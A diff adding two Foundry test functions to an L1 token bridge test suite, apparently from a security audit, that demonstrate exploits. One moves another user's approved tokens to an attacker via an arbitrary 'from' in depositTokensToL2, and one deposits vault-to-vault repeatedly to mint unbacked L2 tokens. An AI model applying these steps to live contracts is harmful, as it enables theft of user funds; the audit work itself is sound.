@@ -223,4 +223,38 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+
+    function testCanMoveApprovedTokensOfOtherUsers() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // attacker
+        uint256 depoAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depoAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depoAmount);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depoAmount);
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("Attacker");
+        uint256 vaultBal = 500 ether;
+        deal(address(token), address(vault), vaultBal);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBal);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBal);
+
+        // an attacker could do this forever, and mint an infinite amount of token on the L2
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBal);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBal);
+
+        assertEq(token.balanceOf(address(vault)), vaultBal);
+    }
 }
